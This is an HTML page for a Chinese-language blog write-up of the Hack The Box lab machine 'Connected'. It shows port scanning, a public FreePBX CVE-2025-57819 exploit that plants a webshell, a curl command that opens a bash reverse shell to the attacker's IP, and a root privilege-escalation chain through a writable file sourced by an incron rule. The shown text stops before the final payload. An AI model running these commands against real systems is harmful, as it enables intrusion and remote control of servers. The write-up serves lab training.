@@ -1,0 +1,713 @@
+<!doctype html>
+<html
+  lang="zh-cn" 
+  data-theme-mode="auto"
+  >
+  <head><meta charset="utf-8" />
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1, shrink-to-fit=no"
+/><title>
+  htb-Connected | L
+</title>
+<meta name="description" content="少女祈祷中..."/><script>
+  window.siteConfig = JSON.parse("{\"anchor_icon\":null,\"base\":\"https://test692618.github.io/\",\"clipboard\":{\"copyright\":{\"count\":50,\"enable\":false,\"license_type\":\"by-nc-sa\"},\"fail\":{\"en\":\"Copy failed (ﾟ⊿ﾟ)ﾂ\",\"ja\":\"コピー失敗 (ﾟ⊿ﾟ)ﾂ\",\"pt-br\":\"Falha ao copiar (ﾟ⊿ﾟ)ﾂ\",\"zh-cn\":\"复制失败 (ﾟ⊿ﾟ)ﾂ\",\"zh-tw\":\"複製失敗 (ﾟ⊿ﾟ)ﾂ\"},\"success\":{\"en\":\"Copy successfully (*^▽^*)\",\"ja\":\"コピー成功 (*^▽^*)\",\"pt-br\":\"Copiado com sucesso (*^▽^*)\",\"zh-cn\":\"复制成功 (*^▽^*)\",\"zh-tw\":\"複製成功 (*^▽^*)\"}},\"code_block\":{\"expand\":true},\"i18n_languages\":[{\"Lang\":\"en\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"English\",\"Locale\":\"\"},{\"Lang\":\"ja\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"日本語\",\"Locale\":\"\"},{\"Lang\":\"zh-cn\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"简体中文\",\"Locale\":\"zh-cn\"},{\"Lang\":\"zh-tw\",\"Title\":\"\",\"Weight\":1,\"Disabled\":false,\"Direction\":\"\",\"Label\":\"繁體中文\",\"Locale\":\"\"}],\"icon_font\":\"4552607_4k4bc36ef96\",\"outdate\":{\"daysago\":180,\"enable\":false,\"message\":{\"en\":\"This article was last updated on {time}. Please note that the content may no longer be applicable.\",\"ja\":\"この記事は最終更新日：{time}。記載内容が現在有効でない可能性がありますのでご注意ください。\",\"pt-br\":\"Este artigo foi atualizado pela última vez em {time}. Observe que o conteúdo pode não ser mais aplicável.\",\"zh-cn\":\"本文最后更新于 {time}，请注意文中内容可能已不适用。\",\"zh-tw\":\"本文最後更新於 {time}，請注意文中內容可能已不適用。\"}}}");
+  
+</script>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+  rel="preload"
+  as="style"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+/>
+<link
+  rel="stylesheet"
+  href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7cNoto%20Serif%20SC:400,400italic,700,700italic%7c&amp;display=swap"
+  media="print"
+  onload="this.media='all'"
+/>
+<link
+    rel="preload"
+    href="//at.alicdn.com/t/c/font_4552607_4k4bc36ef96.woff2"
+    as="font"
+    type="font/woff2"
+    crossorigin="anonymous"
+  /><link rel="stylesheet" href="/css/loader.min.ac746e154f756f8220326eeb52a719f142ab038be5a8ddf30ea5ef15ef2356ea.css" /><meta property="og:type" content="website" />
+  <meta property="og:title" content="htb-Connected | L" />
+  <meta
+    property="og:description"
+    content="少女祈祷中..."
+  />
+  <meta property="og:url" content="https://test692618.github.io/post/htb/htb%E6%89%93%E9%9D%B6-connected/" />
+  <meta
+    property="og:site_name"
+    content="HELLO WORLD"
+  />
+  <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
+  <meta property="article:author" content="L" />
+  <meta property="article:published_time" content="2026-06-19T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-06-19T00:00:00&#43;00:00" /><meta property="article:tag" content="htb" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" />
+<link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css"
+    integrity="sha384-IfxC36XL/toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei&#43;Zx/1oA/0l8ysE" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><link
+    rel="preload"
+    as="style"
+    href="https://npm.webcache.cn/katex@0.16.24/dist/katex.min.css"
+    integrity="sha384-tTgKLjMYmJr94v8qu2PE5MUGSMbyN2xiH266JUB3gpm8vnnJywd1dWSOEfrFz&#43;YI" crossorigin="anonymous"
+    onload="this.onload=null;this.rel='stylesheet'"
+  /><script
+    src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js"
+    
+    
+    
+    
+    integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script><link
+    rel="stylesheet"
+    href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css"
+    integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous"/></head>
+  <body><div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate"><svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+          M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg></div><div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var loaderEl = document.getElementById('loader');
+    var startLoading = () => {
+      time = Date.now();
+      loaderEl.classList.remove("loading");
+    }
+    var hideLoader = () => {
+      document.body.style.overflow = 'auto';
+      loader.classList.add('loading');
+    };
+
+    var endLoading = () => {
+      if (!time) {
+        hideLoader();
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          hideLoader();
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    loaderEl.addEventListener('click', endLoading);
+  </script><div id="copy-tooltip"></div>
+<div id="lang-tooltip">
+本文章没有找到对应的语言版本
+</div>
+<div id="heatmap-tooltip"></div><div id="container">
+      <div id="wrap"><div id="header-nav">
+  <nav id="main-nav" aria-label="Primary navigation"><a class="main-nav-link-wrap" href="/"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">首页</span>
+      </a><a class="main-nav-link-wrap" href="/archives"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">归档</span>
+      </a><a class="main-nav-link-wrap" href="/about"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">关于</span>
+      </a><a class="main-nav-link-wrap" href="/other_site"><div class='main-nav-icon icon rotate'>&#xe62b;</div><span class="main-nav-link">常用网站</span>
+      </a><a id="main-nav-toggle" class="nav-icon" aria-label="Toggle navigation" role="button"></a>
+  </nav>
+  <nav id="sub-nav" aria-label="Secondary navigation"></nav><nav id="i18n-nav" aria-label="Language selection">
+      <div class="custom-dropdown">
+        <div class="select-selected" id="select-selected" role="button" aria-haspopup="listbox" aria-expanded="false" aria-label="Language menu">
+          <span id="nav-language-btn" class="nav-icon" style="padding: 0 20px 0 0"></span>
+          <span id="selected-lang">简体中文</span>
+        </div>
+        <ul class="select-items" id="select-items" role="listbox" aria-label="Languages"><li data-value="en" role="option" aria-selected="false" >English</li><li data-value="ja" role="option" aria-selected="false" >日本語</li><li data-value="zh-cn" role="option" class="selected" aria-selected="true" >简体中文</li><li data-value="zh-tw" role="option" aria-selected="false" >繁體中文</li></ul>
+      </div>
+      <script>
+        var selectSelected = document.getElementById("select-selected");
+        var selectedLang = document.getElementById("selected-lang");
+        var selectItems = document.getElementById("select-items");
+        var selectOptions = selectItems.querySelectorAll("li");
+
+        selectSelected.addEventListener("click", () => {
+          selectItems.classList.toggle("show");
+          var expanded = selectSelected.getAttribute("aria-expanded") === "true";
+          selectSelected.setAttribute("aria-expanded", (!expanded).toString());
+        });
+
+        selectOptions.forEach((item) => {
+          item.addEventListener("click", () => {
+            const langMap = {};selectedLang.textContent = item.textContent;
+            selectItems.classList.remove("show");
+            selectOptions.forEach((option) => {
+              option.classList.remove("selected");
+            });
+            item.classList.add("selected");
+            if (item.dataset.value === 'zh-cn') {
+              return;
+            }
+            if (!langMap[item.dataset.value]) {
+              _$("#lang-tooltip").style.opacity = "1";
+              setTimeout(() => {
+                _$("#lang-tooltip").style.opacity = "0";
+              }, 1000);
+              return;
+            }
+            window.location = langMap[item.dataset.value];
+          });
+        });
+
+        document.addEventListener("click", (event) => {
+          if (!event.target.closest(".custom-dropdown")) {
+            selectItems.classList.remove("show");
+            selectSelected.setAttribute("aria-expanded", "false");
+          }
+        });
+      </script>
+    </nav></div>
+<header id="header" aria-label="Site header"><picture></picture><img  fetchpriority="high" src="/images/banner.webp" alt="htb-Connected"><div id="header-outer">
+    <div id="header-title"><span id="logo">
+            <h1 data-aos="slide-up">htb-Connected</h1>
+          </span><h2 id="subtitle-wrap" data-aos="slide-down"></h2></div>
+  </div>
+</header><div id="content"
+          aria-label="Page content"
+          
+          class="sidebar-right"  ><aside id="sidebar" aria-label="Sidebar"><div class="sidebar-wrapper-container sticky"><div class="sidebar-wrapper">
+    <div
+      class="sidebar-wrap"
+      data-aos="fade-up"
+    ><div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class">
+  <nav id="TableOfContents">
+  <ul>
+    <li><a href="#端口枚举">端口枚举</a></li>
+    <li><a href="#web信息枚举">WEB信息枚举</a></li>
+    <li><a href="#权限提升">权限提升</a>
+      <ul>
+        <li><a href="#必备知识">必备知识</a></li>
+        <li><a href="#攻击链路梳理">攻击链路梳理</a></li>
+        <li><a href="#go">go</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+</div></div>
+          <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img
+    data-src="/avatar/avatar.webp"
+    data-sizes="auto"
+    alt="L"
+    class="lazyload"
+  />
+  <div class="sidebar-author-name">L</div>
+  <div class="sidebar-description">少女祈祷中...</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div><div class="sidebar-state-number">87</div>
+  </div>
+  <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
+    <div>分类</div>
+    <div class="sidebar-state-number">
+      16
+    </div>
+  </a>
+  <a class="sidebar-state-tag" href="/tags/" aria-label="sidebar-state-tag-link">
+    <div>标签</div>
+    <div class="sidebar-state-number">22</div>
+  </a>
+</div>
+<div class="sidebar-social" ><div class="icon-email sidebar-social-icon">
+      <a
+        href="#ZgotmplZ"
+        itemprop="url"
+        target="_blank"
+        aria-label="email"
+        rel="noopener nofollow noreferrer"
+      ></a>
+    </div></div><div class="sidebar-menu"><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/"
+        aria-label="首页"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">首页</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/archives"
+        aria-label="归档"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">归档</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/about"
+        aria-label="关于"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">关于</div>
+    </div><div class="sidebar-menu-link-wrap">
+      <a
+        class="sidebar-menu-link-dummy"
+        href="/other_site"
+        aria-label="常用网站"
+      ></a><div class='sidebar-menu-icon icon rotate'>&#xe62b;</div><div class="sidebar-menu-link">常用网站</div>
+    </div></div></div><div class="sidebar-btn-wrapper" style="position:static">
+            <div class="sidebar-toc-btn current"></div>
+            <div class="sidebar-common-btn"></div>
+          </div></div>
+  </div><div class="sidebar-widget"></div></div></aside>
+<section id="main" aria-label="Main content"><article
+  class="h-entry article"
+  itemscope
+  itemtype="https://schema.org/BlogPosting"
+>
+  <div
+    class="article-inner"
+    data-aos="fade-up"
+  >
+    <div class="article-meta"><div class="article-date">
+  <span
+    class="article-date-link icon-calendar"
+    data-aos="zoom-in"
+  >
+    <time datetime="2026-06-19 00:00:00 &#43;0000 UTC" itemprop="datePublished"
+      >2026-06-19</time
+    >
+    <time style="display: none;" id="post-update-time"
+      >2026-06-19</time
+    >
+  </span></div>
+</div><div class="hr-line"></div><div class="e-content article-entry" itemprop="articleBody"><h2 id="端口枚举">
+<a class="header-anchor" href="#%e7%ab%af%e5%8f%a3%e6%9e%9a%e4%b8%be"></a>
+端口枚举
+</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="nv">ports</span><span class="o">=</span><span class="k">$(</span>nmap --top-ports<span class="o">=</span><span class="m">1000</span>  --min-rate<span class="o">=</span><span class="m">1000</span> -Pn -T4 <span class="nv">$ip</span>  <span class="p">|</span> grep <span class="s1">&#39;^[0-9]&#39;</span> <span class="p">|</span> cut -d <span class="s1">&#39;/&#39;</span> -f <span class="m">1</span> <span class="p">|</span> tr <span class="s1">&#39;\n&#39;</span> <span class="s1">&#39;,&#39;</span> <span class="p">|</span> sed s/,$//<span class="k">)</span>
+</span></span><span class="line"><span class="cl">nmap -p <span class="nv">$ports</span> -Pn -sC -sV <span class="nv">$ip</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">-----
+</span></span><span class="line"><span class="cl">PORT    STATE SERVICE   VERSION
+</span></span><span class="line"><span class="cl">22/tcp  open  ssh       OpenSSH 7.4 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp  open  http      Apache httpd 2.4.6 <span class="o">((</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://connected.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl">443/tcp open  ssl/https Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.6 <span class="o">(</span>CentOS<span class="o">)</span> OpenSSL/1.0.2k-fips PHP/7.4.16
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>pbxconnect/organizationName<span class="o">=</span>SomeOrganization/stateOrProvinceName<span class="o">=</span>SomeState/countryName<span class="o">=</span>--
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2025-11-30T14:07:27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2026-11-30T14:07:27
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: <span class="m">400</span> Bad Request
+</span></span></code></pre></div><h2 id="web信息枚举">
+<a class="header-anchor" href="#web%e4%bf%a1%e6%81%af%e6%9e%9a%e4%b8%be"></a>
+WEB信息枚举
+</h2><p><img src="#ZgotmplZ" alt="image-20260619213121664"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">1.枚举目录，未成功。
+</span></span><span class="line"><span class="cl">2.枚举弱口令，查询freepbx默认口令，未成功。
+</span></span><span class="line"><span class="cl">3.注意页面底部的组件版本--freepbx 16.0.40.7。
+</span></span><span class="line"><span class="cl">	使用searchsploit 未获取可利用漏洞
+</span></span><span class="line"><span class="cl">	常识搜索引擎，存在CVE-2025-57819。下载exp脚本：watchTowr-vs-FreePBX-CVE-2025-57819.py
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">----------------------
+</span></span><span class="line"><span class="cl"><span class="c1">#成功写入webshell</span>
+</span></span><span class="line"><span class="cl">python watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://10.129.28.248/
+</span></span><span class="line"><span class="cl">                         __         ___  ___________                   
+</span></span><span class="line"><span class="cl">         __  _  ______ _/  <span class="p">|</span>__ ____ <span class="p">|</span>  <span class="p">|</span>_<span class="se">\_</span>_    ____<span class="se">\_</span>___  _  ________ 
+</span></span><span class="line"><span class="cl">         <span class="se">\ \/</span> <span class="se">\/</span> <span class="se">\_</span>_  <span class="se">\ </span>   ___/ ___<span class="se">\|</span>  <span class="p">|</span>  <span class="se">\|</span>    <span class="p">|</span> /  _ <span class="se">\ \/</span> <span class="se">\/</span> <span class="se">\_</span>  __ <span class="se">\
+</span></span></span><span class="line"><span class="cl">          <span class="se">\ </span>    / / __ <span class="se">\|</span>  <span class="p">|</span> <span class="se">\ </span> <span class="se">\_</span>__<span class="p">|</span>   Y  <span class="p">|</span>    <span class="p">|</span><span class="o">(</span>  &lt;_&gt; <span class="se">\ </span>    / <span class="p">|</span>  <span class="p">|</span> <span class="se">\/</span>
+</span></span><span class="line"><span class="cl">           <span class="se">\/\_</span>/ <span class="o">(</span>____  <span class="p">|</span>__<span class="p">|</span>  <span class="se">\_</span>__  <span class="p">|</span>___<span class="p">|</span>__<span class="p">|</span>__  <span class="p">|</span> <span class="se">\_</span>_  / <span class="se">\/\_</span>/  <span class="p">|</span>__<span class="p">|</span>   
+</span></span><span class="line"><span class="cl">                                  <span class="se">\/</span>          <span class="se">\/</span>     <span class="se">\/</span>                            
+</span></span><span class="line"><span class="cl">          
+</span></span><span class="line"><span class="cl">        watchTowr-vs-FreePBX-CVE-2025-57819.py
+</span></span><span class="line"><span class="cl">        <span class="o">(</span>*<span class="o">)</span> CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">          - Piotr and Sonny of watchTowr
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> FreePBX CVE-2025-57819 Detection Artifact Generator started
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Sending exploit request
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Waiting <span class="m">2</span> minutes <span class="k">for</span> DAG script to be created
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> VULNERABLE - webshell found: https://10.129.28.248/this-is-an-ioc-not-actually-watchTowr-ojtatmtfx2.php?cmd<span class="o">=</span>hostname
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#返回响应  -k 表示跳过证书错误</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">└─$ curl https://10.129.28.248/this-is-an-ioc-not-actually-watchTowr-ojtatmtfx2.php?cmd<span class="o">=</span>hostname -k
+</span></span><span class="line"><span class="cl">connected
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#反弹shell</span>
+</span></span><span class="line"><span class="cl"> curl <span class="s2">&#34;https://10.129.28.248/this-is-an-ioc-not-actually-watchTowr-ojtatmtfx2.php?cmd=bash+-c+&#39;bash+-i+&gt;%26+/dev/tcp/10.10.17.50/6666+0&gt;%261&#39;&#34;</span> -k
+</span></span></code></pre></div><h2 id="权限提升">
+<a class="header-anchor" href="#%e6%9d%83%e9%99%90%e6%8f%90%e5%8d%87"></a>
+权限提升
+</h2><h3 id="必备知识">
+<a class="header-anchor" href="#%e5%bf%85%e5%a4%87%e7%9f%a5%e8%af%86"></a>
+必备知识
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">一、Incron —— 基于文件系统事件的&#34;定时任务&#34;替代品
+</span></span><span class="line"><span class="cl">Incron（inotify cron）本质上是一个事件驱动的自动化守护进程，不是按时间来触发任务，而是当某个文件/目录发生变化时立刻触发脚本。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">组成:incrond（后台守护进程）+ incrontab（管理表，用法类似 crontab）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">监听事件:文件创建/删除/修改/移动/属性变化等（IN_CREATE、IN_DELETE、IN_MODIFY…）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">典型用途:配置文件变更后自动 reload 服务、上传目录有新文件自动处理、关键文件防篡改监控、自动备份/版本化等
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">简单例子：监控 /etc/nginx/conf.d/，一旦有 .conf文件新增或修改，就自动执行 nginx -t &amp;&amp; systemctl reload nginx。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">⚠️ 安全角度提示：Incron 本身不是恶意软件，它是合法的系统工具（Debian/Ubuntu 仓库里就有）。但因为它能静默地在文件变化时执行任意命令，如果服务器上出现了来历不明的 incron 规则（incrontab -l或 /etc/incron*），确实需要审查——它可能被人用作持久化/应急响应对抗的手段。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">二、DAHDI —— 电话硬件驱动框架（Asterisk 电话系统用）
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">DAHDI（Digium/Asterisk Hardware Device Interface）是一套 Linux 内核级驱动 + 用户态工具集，用于在服务器上驱动传统电话接口硬件卡（PCI/PCIe 板卡），让开源电话系统 Asterisk​ 能对接实体电话线路。
+</span></span><span class="line"><span class="cl">管什么:模拟电话口（FXO/FXS）、数字线路（T1/E1/PRI）、BRI ISDN 等电信接口卡
+</span></span><span class="line"><span class="cl">对外接口:/dev/dahdi/*字符设备、SysFS、/proc 等
+</span></span><span class="line"><span class="cl">你什么时候需要它:你的服务器上插了 Sangoma/Digium 等电话板卡，跑 VoIP-PSTN 网关或呼叫中心系统.
+</span></span></code></pre></div><h3 id="攻击链路梳理">
+<a class="header-anchor" href="#%e6%94%bb%e5%87%bb%e9%93%be%e8%b7%af%e6%a2%b3%e7%90%86"></a>
+攻击链路梳理
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">首先，要了解系统的特殊性。
+</span></span><span class="line"><span class="cl">	该系统为freepbx，该组件为“电话系统”，因此枚举时可关注电话系统涉及到的特殊的服务。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#寻找可利用的服务或文件。</span>
+</span></span><span class="line"><span class="cl">	寻找可写的文件
+</span></span><span class="line"><span class="cl">	find /etc -writable 2&gt;/dev/null <span class="p">|</span> grep -v <span class="s2">&#34;/etc/wanpipe\|/etc/asterisk\|/etc/schmooze&#34;</span> <span class="p">|</span> head -20
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	发现/etc/dahdi/init.conf 文件，dahdi与电话相关组件。
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl"><span class="c1">#进一步发现Incron服务</span>
+</span></span><span class="line"><span class="cl">	cat /etc/incron.d/legacy  <span class="c1">#该目录/etc/incron.d下的文件为系统表，事件触发时会用root权限执行。</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	发现此配置：
+</span></span><span class="line"><span class="cl">		/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
+</span></span><span class="line"><span class="cl">	解释：
+</span></span><span class="line"><span class="cl">		/var/spool/asterisk/sysadmin/dahdi_restart   ← 监控什么 ，监控的目标文件
+</span></span><span class="line"><span class="cl">		IN_CLOSE_WRITE                                 ← 什么事件，有进程以可写模式打开了这个文件，写完之后关闭了它（即一次 write→close 完成）
+</span></span><span class="line"><span class="cl">		/usr/sbin/sysadmin_dahdi_restart               ← 触发什么命令 ，事件发生后，立刻以root权限执行这个脚本
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	--------------------
+</span></span><span class="line"><span class="cl">	到此，利用思路为：
+</span></span><span class="line"><span class="cl">		1.将恶意脚本写入/usr/sbin/sysadmin_dahdi_restart中
+</span></span><span class="line"><span class="cl">		2.向/var/spool/asterisk/sysadmin/dahdi_restart文件 作为触发条件。
+</span></span><span class="line"><span class="cl">		3.等待执行结果。
+</span></span><span class="line"><span class="cl">	--------------------
+</span></span><span class="line"><span class="cl">	<span class="c1"># 此文件可修改：/var/spool/asterisk/sysadmin/dahdi_restart</span>
+</span></span><span class="line"><span class="cl">	 ls -al /var/spool/asterisk/sysadmin/dahdi_restart                       
+</span></span><span class="line"><span class="cl">		-rw-rw-r--. <span class="m">1</span> asterisk asterisk <span class="m">5</span> Jun <span class="m">19</span> 14:35 /var/spool/asterisk/sysadmin/dahdi_restart
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1"># 该文件/usr/sbin/sysadmin_dahdi_restart  ，为root权限，无法修改。</span>
+</span></span><span class="line"><span class="cl">	ls -al /usr/sbin/sysadmin_dahdi_restart
+</span></span><span class="line"><span class="cl">-rwxr-xr-x. <span class="m">1</span> root root <span class="m">157</span> Apr <span class="m">15</span>  <span class="m">2021</span> /usr/sbin/sysadmin_dahdi_restart
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="c1"># 查看文件内容，发现包含了此文件：/etc/init.d/dahdi</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	cat /usr/sbin/sysadmin_dahdi_restart
+</span></span><span class="line"><span class="cl">        <span class="c1">#!/bin/sh</span>
+</span></span><span class="line"><span class="cl">        /etc/init.d/asterisk stop
+</span></span><span class="line"><span class="cl">        sleep <span class="m">5</span>
+</span></span><span class="line"><span class="cl">        /etc/init.d/dahdi restart
+</span></span><span class="line"><span class="cl">        sleep <span class="m">5</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">export</span> <span class="nv">PATH</span><span class="o">=</span><span class="nv">$PATH</span>:/usr/local/sbin/:/usr/local/bin/
+</span></span><span class="line"><span class="cl">        <span class="sb">`</span>which amportal<span class="sb">`</span> start
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">	<span class="c1"># 该文件也是root权限</span>
+</span></span><span class="line"><span class="cl">        ls -al /etc/init.d/dahdi
+</span></span><span class="line"><span class="cl">        -rwxr-xr-x. <span class="m">1</span> root root <span class="m">8496</span> Jun  <span class="m">5</span>  <span class="m">2023</span> /etc/init.d/dahdi
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="c1"># 查看 /etc/init.d/dahdi 文件，存在/etc/dahdi/init.conf内容	</span>
+</span></span><span class="line"><span class="cl">		.......................
+</span></span><span class="line"><span class="cl">        <span class="nv">DAHDI_MODULES_FILE</span><span class="o">=</span><span class="s2">&#34;/etc/dahdi/modules&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">[</span> -r /etc/dahdi/init.conf <span class="o">]</span> <span class="o">&amp;&amp;</span> . /etc/dahdi/init.conf 
+</span></span><span class="line"><span class="cl">        .........................
+</span></span><span class="line"><span class="cl">  ---------------------------------------
+</span></span><span class="line"><span class="cl">  至此,文件关系：
+</span></span><span class="line"><span class="cl">  	/usr/sbin/sysadmin_dahdi_restart  
+</span></span><span class="line"><span class="cl">  	---- /etc/init.d/dahdi 
+</span></span><span class="line"><span class="cl">   	---------/etc/dahdi/init.conf  &lt;---将恶意脚本写入
+</span></span><span class="line"><span class="cl">   ---------------------------------
+</span></span><span class="line"><span class="cl">    
